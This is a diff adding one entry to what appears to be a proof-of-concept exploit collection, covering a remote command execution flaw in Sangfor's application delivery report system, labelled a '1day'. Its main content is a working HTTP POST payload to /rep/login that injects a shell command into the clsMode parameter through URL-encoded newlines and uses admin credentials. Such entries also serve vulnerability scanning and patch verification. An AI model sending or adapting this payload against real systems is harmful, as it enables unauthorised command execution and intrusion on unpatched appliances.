@@ -1,0 +1,8 @@
+vendor = "深信服"
+name = "深信服应用交付报表系统远程命令执行漏洞"
+type = "RCE"
+source = "360漏洞云"
+info = "360LDYLD-2023-00002368 版本有限制"
+date = "08.09"
+poc = "POST /rep/login Host:10.10.10.1:85 clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
+label = "1day"
